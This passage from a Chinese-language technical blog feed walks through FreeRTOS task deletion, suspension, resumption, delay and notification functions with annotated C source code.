class="hljs-comment">/* If a running task is not deleting itself, call prvDeleteTCB. If a running</span><br><span class="hljs-comment">         * task deletes itself, prvDeleteTCB is called from prvCheckTasksWaitingTermination</span><br><span class="hljs-comment">         * which is called from Idle task. */</span><br>        <span class="hljs-keyword">if</span>( pxTCB-&gt;xTaskRunState == taskTASK_NOT_RUNNING )<br>        &#123;<br>            prvDeleteTCB( pxTCB );<br>        &#125;<br><br>        <span class="hljs-comment">/* Force a reschedule if the task that has just been deleted was running. */</span><br>        <span class="hljs-keyword">if</span>( ( xSchedulerRunning != pdFALSE ) &amp;&amp; ( taskTASK_IS_RUNNING( pxTCB ) == pdTRUE ) )<br>        &#123;<br>            <span class="hljs-keyword">if</span>( pxTCB-&gt;xTaskRunState == ( BaseType_t ) portGET_CORE_ID() )<br>            &#123;<br>                configASSERT( uxSchedulerSuspended == <span class="hljs-number">0</span> );<br>                vTaskYieldWithinAPI();<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                prvYieldCore( pxTCB-&gt;xTaskRunState );<br>            &#125;<br>        &#125;<br><br>        taskEXIT_CRITICAL();<br>    &#125;<br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* #if ( configNUMBER_OF_CORES == 1 ) */</span></span><br><br>    traceRETURN_vTaskDelete();<br>&#125;<br></code></pre></td></tr></table></figure><p><code>vTaskDelete()</code>函数用于删除一个任务。当一个任务删除另一个任务时，形参为要删除的任务创建时返回的任务句柄。如果是删除自身，则形参为<code>NULL</code>。要想使用该函数，必须在<code>FreeRTOSConfig.h</code>中把<code>INCLUDE_vTaskDelete</code>定义为1，要删除的任务将从所有就绪、阻塞、挂起和事件列表中删除. </p><h2 id="任务挂起函数"><a href="#任务挂起函数" class="headerlink" title="任务挂起函数"></a>任务挂起函数</h2><p>挂起函数不会禁用中断, 但是无法进行上下文切换, 也就是无法进行任务转换. </p><p>通过<code>vTaskSuspend()</code>函数将任何的转换到挂起态. 我们来分析一下这个函数:<br>这个函数位于<code>task.c</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vTaskSuspend</span><span class="hljs-params">( TaskHandle_t xTaskToSuspend )</span><span class="hljs-comment">//哪个任务需要被挂起</span><br>&#123;<br>    TCB_t * pxTCB;<br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configNUMBER_OF_CORES &gt; 1 )</span><br>        BaseType_t xTaskRunningOnCore;<br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    traceENTER_vTaskSuspend( xTaskToSuspend );<br><br>    taskENTER_CRITICAL();<br>    &#123;<br>        <span class="hljs-comment">/* If null is passed in here then it is the running task that is</span><br><span class="hljs-comment">         * being suspended. */</span><br>        pxTCB = prvGetTCBFromHandle( xTaskToSuspend );<span class="hljs-comment">//简单进行检查, 看xTaskToSuspend是否是NULL</span><br><br>        traceTASK_SUSPEND( pxTCB );<br><br>        <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configNUMBER_OF_CORES &gt; 1 )</span><br>            xTaskRunningOnCore = pxTCB-&gt;xTaskRunState;<br>        <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>        <span class="hljs-comment">/* Remove task from the ready/delayed list and place in the</span><br><span class="hljs-comment">         * suspended list. */</span><br>        <span class="hljs-keyword">if</span>( uxListRemove( &amp;( pxTCB-&gt;xStateListItem ) ) == ( UBaseType_t ) <span class="hljs-number">0</span> )<span class="hljs-comment">//将这个任务从就绪或者是阻塞表中删除, 放入挂起列表</span><br>        &#123;<br>            taskRESET_READY_PRIORITY( pxTCB-&gt;uxPriority );<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            mtCOVERAGE_TEST_MARKER();<br>        &#125;<br><br>        <span class="hljs-comment">/* Is the task waiting on an event also? */</span><br>        <span class="hljs-keyword">if</span>( listLIST_ITEM_CONTAINER( &amp;( pxTCB-&gt;xEventListItem ) ) != <span class="hljs-literal">NULL</span> )<br>        &#123;<br>            ( <span class="hljs-type">void</span> ) uxListRemove( &amp;( pxTCB-&gt;xEventListItem ) );<span class="hljs-comment">//删除在任务列表中的任务</span><br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            mtCOVERAGE_TEST_MARKER();<br>        &#125;<br><br>        vListInsertEnd( &amp;xSuspendedTaskList, &amp;( pxTCB-&gt;xStateListItem ) );<span class="hljs-comment">//将任务状态添加到挂起队列</span><br><br>        <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configUSE_TASK_NOTIFICATIONS == 1 )</span><br>        &#123;<br>            BaseType_t x;<br><br>            <span class="hljs-keyword">for</span>( x = ( BaseType_t ) <span class="hljs-number">0</span>; x &lt; ( BaseType_t ) configTASK_NOTIFICATION_ARRAY_ENTRIES; x++ )<br>            &#123;<br>                <span class="hljs-keyword">if</span>( pxTCB-&gt;ucNotifyState[ x ] == taskWAITING_NOTIFICATION )<br>                &#123;<br>                    <span class="hljs-comment">/* The task was blocked to wait for a notification, but is</span><br><span class="hljs-comment">                     * now suspended, so no notification was received. */</span><br>                    pxTCB-&gt;ucNotifyState[ x ] = taskNOT_WAITING_NOTIFICATION;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* if ( configUSE_TASK_NOTIFICATIONS == 1 ) */</span></span><br>    &#125;<br><br>    <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configNUMBER_OF_CORES == 1 )<span class="hljs-comment">//只有一个内核</span></span><br>    &#123;<br>        taskEXIT_CRITICAL();<br>        <span class="hljs-comment">//非当前任务</span><br>        <span class="hljs-keyword">if</span>( xSchedulerRunning != pdFALSE )<span class="hljs-comment">//如果调度器正在运行的话</span><br>        &#123;<br>            <span class="hljs-comment">/* Reset the next expected unblock time in case it referred to the</span><br><span class="hljs-comment">             * task that is now in the Suspended state. */</span><br>            taskENTER_CRITICAL();<br>            &#123;<br>                prvResetNextTaskUnblockTime();<br>            &#125;<br>            taskEXIT_CRITICAL();<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            mtCOVERAGE_TEST_MARKER();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>( pxTCB == pxCurrentTCB )<span class="hljs-comment">//pxTCB指向当前任务</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>( xSchedulerRunning != pdFALSE )<span class="hljs-comment">//调度器正在执行</span><br>            &#123;<br>                <span class="hljs-comment">/* The current task has just been suspended. */</span><br>                configASSERT( uxSchedulerSuspended == <span class="hljs-number">0</span> );<span class="hljs-comment">//uxSchedulerSuspended==0表示调度器是否被挂起</span><br>                portYIELD_WITHIN_API();<span class="hljs-comment">//进行任务切换</span><br>            &#125;<br>            <span class="hljs-keyword">else</span><span class="hljs-comment">//如果没有调度器没有在执行</span><br>            &#123;<br>                <span class="hljs-comment">/*调度器没有运行, 但是pxCurrentTCB指向的任务正好被挂起了, 所以我们必须要更改pxCurrentTCB*/</span><br>                <span class="hljs-keyword">if</span>( listCURRENT_LIST_LENGTH( &amp;xSuspendedTaskList ) == uxCurrentNumberOfTasks )<span class="hljs-comment">//这里是使用通过将挂起任务队列中结点数量和当前系统中的任务数比较, 如果相同则表示所有的任务都被挂起了</span><br>                &#123;<br>                    <span class="hljs-comment">/* No other tasks are ready, so set pxCurrentTCB back to</span><br><span class="hljs-comment">                     * NULL so when the next task is created pxCurrentTCB will</span><br><span class="hljs-comment">                     * be set to point to it no matter what its relative priority</span><br><span class="hljs-comment">                     * is. */</span><br>                    pxCurrentTCB = <span class="hljs-literal">NULL</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    vTaskSwitchContext();<span class="hljs-comment">//由于不是所有的任务都是挂起状态, 所以转换pxCurrentTCB, 切换上下文</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><span class="hljs-comment">//pxTCB指向的不是当前任务</span><br>        &#123;<br>            mtCOVERAGE_TEST_MARKER();<br>        &#125;<br>    &#125;<br>    <span class="hljs-meta">#<span class="hljs-keyword">else</span> <span class="hljs-comment">/* #if ( configNUMBER_OF_CORES == 1 ) 不止一个内核时*/</span></span><br>    &#123;<br>        <span class="hljs-keyword">if</span>( xSchedulerRunning != pdFALSE )<br>        &#123;<br>            <span class="hljs-comment">/* Reset the next expected unblock time in case it referred to the</span><br><span class="hljs-comment">             * task that is now in the Suspended state. */</span><br>            prvResetNextTaskUnblockTime();<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            mtCOVERAGE_TEST_MARKER();<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>( taskTASK_IS_RUNNING( pxTCB ) == pdTRUE )<br>        &#123;<br>            <span class="hljs-keyword">if</span>( xSchedulerRunning != pdFALSE )<br>            &#123;<br>                <span class="hljs-keyword">if</span>( xTaskRunningOnCore == ( BaseType_t ) portGET_CORE_ID() )<br>                &#123;<br>                    <span class="hljs-comment">/* The current task has just been suspended. */</span><br>                    configASSERT( uxSchedulerSuspended == <span class="hljs-number">0</span> );<br>                    vTaskYieldWithinAPI();<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    prvYieldCore( xTaskRunningOnCore );<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                <span class="hljs-comment">/* This code path is not possible because only Idle tasks are</span><br><span class="hljs-comment">                 * assigned a core before the scheduler is started ( i.e.</span><br><span class="hljs-comment">                 * taskTASK_IS_RUNNING is only true for idle tasks before</span><br><span class="hljs-comment">                 * the scheduler is started ) and idle tasks cannot be</span><br><span class="hljs-comment">                 * suspended. */</span><br>                mtCOVERAGE_TEST_MARKER();<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            mtCOVERAGE_TEST_MARKER();<br>        &#125;<br><br>        taskEXIT_CRITICAL();<br>    &#125;<br>    <span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* #if ( configNUMBER_OF_CORES == 1 ) */</span></span><br><br>    traceRETURN_vTaskSuspend();<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>注意</strong>：<strong>任务可以调用vTaskSuspend()函数来挂起自身，但是在挂起自身时会进行一次任务上下文切换，需要挂起自身时就将xTaskToSuspend设置为NULL传递进来即可。</strong>无论任务是什么状态都可以被挂起，只要调用了vTaskSuspend()函数就会挂起成功，不论是挂起其他任务还是挂起任务自身。</p><p>函数<code>vTaskSuspendAll()</code>这个函数是<strong>挂起所有的</strong>任务. 其原理就是直接将调度器锁上. 与之相反的函数是<code>xTaskResumeAll()</code>, 调用了多少次<code>vTaskSuspendAll()</code>就需要调用多少次<code>xTaskResumeAll()</code>来恢复. </p><p><code>vTaskSuspendAll()</code>函数的源码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1</span> <span class="hljs-type">void</span> <span class="hljs-title function_">vTaskSuspendAll</span><span class="hljs-params">( <span class="hljs-type">void</span> )</span><br>2 &#123;<br><span class="hljs-number">3</span>    ++uxSchedulerSuspended;(<span class="hljs-number">1</span>)<br><span class="hljs-number">4</span>&#125;<br></code></pre></td></tr></table></figure><p><code>uxSchedulerSuspended</code>用于记录调度器是否被挂起，该变量默认初始值为<code>pdFALSE</code>，表明调度器是未被挂起的，每调用一次<code>vTaskSuspendAll()</code>函数就将变量加1，用于记录调用了多少次<code>vTaskSuspendAll()</code>函数。</p><h2 id="任务恢复函数"><a href="#任务恢复函数" class="headerlink" title="任务恢复函数"></a>任务恢复函数</h2><p>上面说到的函数<code>xTaskResumeAll()</code>也是一种恢复函数, 只是这个函数是和<code>vTaskSuspendAll()</code>对应的, 和函数<code>vTaskSuspendAll()</code>对应的是<code>vTaskResume()</code></p><p>这个函数也位于<code>task.c</code> 中:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vTaskResume</span><span class="hljs-params">( TaskHandle_t xTaskToResume )</span><br>   &#123;<br>       TCB_t * <span class="hljs-type">const</span> pxTCB = xTaskToResume;<br><br>       traceENTER_vTaskResume( xTaskToResume );<br><br>       <span class="hljs-comment">/* It does not make sense to resume the calling task. 恢复调用任务是没有意义的, 意思是xTaskToResume不要是自己*/</span><br>       configASSERT( xTaskToResume );<br><br>       <span class="hljs-meta">#<span class="hljs-keyword">if</span> ( configNUMBER_OF_CORES == 1 )<span class="hljs-comment">//一核心</span></span><br><br>           <span class="hljs-comment">/* The parameter cannot be NULL as it is impossible to resume the</span><br><span class="hljs-comment">            * currently executing task. */</span><br>           <span class="hljs-keyword">if</span>( ( pxTCB != pxCurrentTCB ) &amp;&amp; ( pxTCB != <span class="hljs-literal">NULL</span> ) )<span class="hljs-comment">//恢复调用任务是没有意义的, 意思是xTaskToResume不要是自己和NULL</span><br>       <span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br><br>           <span class="hljs-comment">/* The parameter cannot be NULL as it is impossible to resume the</span><br><span class="hljs-comment">            * currently executing task. It is also impossible to resume a task</span><br><span class="hljs-comment">            * that is actively running on another core but it is not safe</span><br><span class="hljs-comment">            * to check their run state here. Therefore, we get into a critical</span><br><span class="hljs-comment">            * section and check if the task is actually suspended or not. */</span><br>           <span class="hljs-keyword">if</span>( pxTCB != <span class="hljs-literal">NULL</span> )<br>       <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>       &#123;<br>           taskENTER_CRITICAL();<span class="hljs-comment">//进入临界区</span><br>           &#123;<br>               <span class="hljs-keyword">if</span>( prvTaskIsTaskSuspended( pxTCB ) != pdFALSE )<span class="hljs-comment">//pxTCB是挂起状态</span><br>               &#123;<br>                   traceTASK_RESUME( pxTCB );<br><br>                   <span class="hljs-comment">/* The ready list can be accessed even if the scheduler is</span><br><span class="hljs-comment">                    * suspended because this is inside a critical section. */</span><br>                   ( <span class="hljs-type">void</span> ) uxListRemove( &amp;( pxTCB-&gt;xStateListItem ) );<span class="hljs-comment">//从挂起表中移除</span><br>                   prvAddTaskToReadyList( pxTCB );<span class="hljs-comment">//添加到就绪表</span><br><br>                   <span class="hljs-comment">/* This yield may not cause the task just resumed to run,</span><br><span class="hljs-comment">                    * but will leave the lists in the correct state for the</span><br><span class="hljs-comment">                    * next yield. */</span><br>                   taskYIELD_ANY_CORE_IF_USING_PREEMPTION( pxTCB );<span class="hljs-comment">//如果当前任务的优先级小于pxTCB指向的优先级则进行上下文切换(任务切换)</span><br>               &#125;<br>               <span class="hljs-keyword">else</span><span class="hljs-comment">//pxTCB不是挂起状态</span><br>               &#123;<br>                   mtCOVERAGE_TEST_MARKER();<br>               &#125;<br>           &#125;<br>           taskEXIT_CRITICAL();<span class="hljs-comment">//退出临界区</span><br>       &#125;<br>       <span class="hljs-keyword">else</span><br>       &#123;<br>           mtCOVERAGE_TEST_MARKER();<br>       &#125;<br><br>       traceRETURN_vTaskResume();<br>   &#125;<br></code></pre></td></tr></table></figure><p>这个函数和<code>vTaskSuspendAll()</code>那两个函数不同的是:<br>无论任务在挂起时调用过多少次<code>vTaskSuspend()</code>函数，只需要调用<strong>一次</strong><code>vTaskResume()</code>函数即可将任务恢复运行，当然，无论调用多少次<code>vTaskResume()</code>函数，也只在任务为挂起态时才进行恢复。</p><p>前面提到了<code>xTaskResumeAll()</code>函数, 下面是其源码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><br></code></pre></td></tr></table></figure><h2 id="任务延时函数"><a href="#任务延时函数" class="headerlink" title="任务延时函数"></a>任务延时函数</h2><p>我们知道任何形式的轮询有一下几个缺点，其中最重要的是它的效率低下。在轮询期间，该任务实际上没有任何工作要做，但它仍然使用最长的处理时间，因此浪费了处理器的资源。使用任务延时函数可以解决这个问题，这是因为FreeRTOS中的延时函数实际上是将这个任务状态转换为阻塞，直到设置的时间到达。所以这使得在“延时”的时候是可以通过调度程序来做其他事情的。</p><p><strong>这个延时函数就是普通的延时，而绝对延时保证的是任务重复执行的时间间隔。</strong></p><p>在FreeRTOS中两个延时函数，分别是：<br><code>vTaskDelay()</code>相对延时函数和<code>vTaskDelayUntil()</code>绝对延时函数。前者的时间精度要小于后者。</p><h3 id="相对延时函数vTaskDelay"><a href="#相对延时函数vTaskDelay" class="headerlink" title="相对延时函数vTaskDelay()"></a>相对延时函数vTaskDelay()</h3><p>请注意，<code>vTaskDelay()</code> <code>API</code> 函数是仅当 <code>FreeRTOSConfig.h</code> 中的 <code>INCLUDE_vTaskDelay</code> 设置为 1 时才可用。</p><p><code>vTaskDelay()</code> 将调用任务置于阻塞状态，以获得固定数量的滴答中断。任务在处于阻塞状态时不使用任何处理时间，因此任务仅在实际工作时使用处理时间。</p><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vTaskDelay</span><span class="hljs-params">( TickType_txTicksToDelay )</span>;<br></code></pre></td></tr></table></figure><p>参数：</p><blockquote><p>调用任务在转换回就绪状态之前将保持在阻塞状态的滴答中断数。例如，如果一个名为 vTaskDelay(100) 的任务在滴答计数为 10,000 时立即进入阻塞状态，并保持阻塞状态，直到滴答计数达到 10,100。可以使用宏 pdMS_TO_TICKS() 将以毫秒为单位的时间转换为以 int 为单位的时间。例如，调用 vTaskDelay(pdMS_TO_TICKS(100)) 将导致调用任务保持阻塞状态 100 毫秒。</p></blockquote><p>下面是一个例子</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vTaskFunction</span><span class="hljs-params">( <span class="hljs-type">void</span> *pvParameters )</span> <br>&#123; <br><span class="hljs-type">char</span> *pcTaskName; <br><span class="hljs-type">const</span> TickType_t xDelay250ms = pdMS_TO_TICKS( <span class="hljs-number">250</span> );<br><br>    <span class="hljs-comment">/* 要打印的字符串通过参数传入。将此转换为字符指针。 */</span><br>    pcTaskName = ( <span class="hljs-type">char</span> * ) pvParameters;<br><br>    <span class="hljs-comment">/* 对于大多数任务，都是在一个无限循环中实现的。 */</span><br>    <span class="hljs-keyword">for</span>( ;; )<br>    &#123;<br>        <span class="hljs-comment">/* 打印出此任务的名称。 */</span><br>        vPrintString( pcTaskName );<br><br>        <span class="hljs-comment">/* 延迟一段时间。 这次调用 vTaskDelay() 会将任务置于阻塞状态，直到延迟时间结束。</span><br><span class="hljs-comment">        参数需要 &#x27;ticks&#x27; 中指定的时间，并使用 pdMS_TO_TICKS() 宏（声明 xDelay250ms </span><br><span class="hljs-comment">        常量）将 250 毫秒转换为滴答的等效时间。*/</span><br>        vTaskDelay( xDelay250ms );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="绝对延时函数-vTaskDelayUntil"><a href="#绝对延时函数-vTaskDelayUntil" class="headerlink" title="绝对延时函数 vTaskDelayUntil()"></a>绝对延时函数 vTaskDelayUntil()</h3><p>绝对延时常用于较精确的周期运行任务，比如希望某个任务以固定频率定期执行，而不受外部的影响，任务从上一次运行开始到下一次运行开始的时间间隔是绝对的，而不是相对的。</p><p>要想使用该函数，必须在FreeRTOSConfig.h中把INCLUDE_vTaskDelayUntil定义为1。</p><p>vTaskDelayUntil()与vTaskDelay()一样，都用来实现任务的周期性延时，但vTaskDelay()的延时是相对的，是不确定的，它的延时是等vTaskDelay()调用完毕后开始计算的，并且vTaskDelay()延时的时间到了之后，如果有高优先级的任务或者中断正在执行，被延时阻塞的任务并不会马上解除阻塞，所以每次执行任务的周期并不完全确定。而vTaskDelayUntil()延时是绝对的，适用于周期性执行的任务。当*pxPreviousWakeTime+xTimeIncrement时间到达后，vTaskDelayUntil()函数立刻返回，如果任务是最高优先级的，那么任务会立刻解除阻塞，所以说vTaskDelayUntil()函数的延时是绝对性的。</p><p><strong>所以这两个函数最大的区别在于前者是从调用这个函数就开始计时的，但是后者是直接确定了任务重复执行的时间间隔。</strong><br>具体可以看这个文件：<a href="https://zhuanlan.zhihu.com/p/475762149">https://zhuanlan.zhihu.com/p/475762149</a></p><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">vTaskDelayUntil</span><span class="hljs-params">( TickType_t* pxPreviousWakeTime, TickType_t xTimeIncrement )</span>;<br></code></pre></td></tr></table></figure><p>参数：<br>pxPreviousWakeTime:</p><blockquote><p>此参数的命名是基于 vTaskDelayUntil() 用于实现定期执行且具有固定频率的任务。 在这种情况下，pxPreviousWakeTime 保持任务最后一次离开阻塞状态的时间（被 ‘唤醒’）。 此时间用作参考点，用于计算任务下次离开阻塞状态的时间。pxPreviousWakeTime 指向的变量在 vTaskDelayUntil()函数中自动更新；它通常不会被应用程序代码修改，但必须在第一次使用之前初始化为当前的滴答计数。 清单 25 演示了如何执行初始化。</p></blockquote><p>xTimeIncrement :</p><blockquote><p>此参数的命名也是基于 vTaskDelayUntil() 用于实现定期执行且具有固定频率的任务，频率由 xTimeIncrement 值设置。xTimeIncrement 在 ‘ticks’ 中指定。 pdMS_TO_TICKS()宏可用于将毫秒指定的时间转换为刻度中指定的时间。</p></blockquote><h1 id="任务通知"><a href="#任务通知" class="headerlink" title="任务通知"></a>任务通知</h1><p>FreeRTOS从V8.2.0版本开始提供任务通知功能，每个任务都有一个32位的通知值，在大多数情况下，任务通知可以替代二值信号量、计数信号量、事件组，也可以替代长度为1的队列（可以保存一个32位整数或指针值）。相对于以前使用FreeRTOS内核通信的资源时必须创建队列、二进制信号量、计数信号量或事件组的情况，使用任务通知显然更灵活。</p><p>默认情况下，RTOS 任务通知功能为启用状态，并且可以 通过将 <code>FreeRTOSConfig.h</code> 中的 <code>configUSE_TASK_NOTIFICATIONS</code> 设置为 <code>0</code> 将其从构建中排除（每个数组索引的每个任务节省 8 字节）。</p><p>FreeRTOS提供以下几种对于通知的处理：</p><ul><li>发送通知给任务，如果有通知未读，则不覆盖通知值。   </li><li>发送通知给任务，直接覆盖通知值。   </li><li>发送通知给任务，设置通知值的一个或者多个位，可以当作<strong>事件组</strong>来使用。   </li><li>发送通知给任务，递增通知值，可以当作<strong>计数信号量</strong>使用。</li></ul><p>通过对以上任务通知方式的合理使用，可以在一定场合下替代FreeRTOS的信号量、队列、事件组等。</p><h2 id="任务通知的优缺点"><a href="#任务通知的优缺点" class="headerlink" title="任务通知的优缺点"></a>任务通知的优缺点</h2><p>根据FreeRTOS官方文档指出, 使用任务通知比通过信号量等ICP通信方式解除阻塞的任务速度要快45%，并且更加省RAM内存空间（使用GCC编译器，-o2优化级别），任务通知的使用无须创建队列。</p><p>更加少的RAM空间, 使得任务通知有以下缺点:</p><ul><li>只能有一个任务接收通知消息，因为必须指定接收通知的任务。</li><li>只有等待通知的任务可以被阻塞，发送通知的任务在任何情况下都不会因为发送失败而进入阻塞态。</li></ul><h2 id="任务通知的运作机制"><a href="#任务通知的运作机制" class="headerlink" title="任务通知的运作机制"></a>任务通知的运作机制</h2><p>这个机制其实在<code>TCB</code>是包含了的: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">volatile</span> <span class="hljs-type">uint32_t</span> ulNotifiedValue[ configTASK_NOTIFICATION_ARRAY_ENTRIES ];<br><span class="hljs-keyword">volatile</span> <span class="hljs-type">uint8_t</span> ucNotifyState[ configTASK_NOTIFICATION_ARRAY_ENTRIES ];<br></code></pre></td></tr></table></figure><p>这些成员其实就是任务通知机制的数据结构. </p><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3>]]></content>
    
    
    <categories>
      
      <category>FreeRTOS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FreeRtOs(1)-基础知识</title>
    <link href="/2024/01/06/FreeRtOs-1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2024/01/06/FreeRtOs-1-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
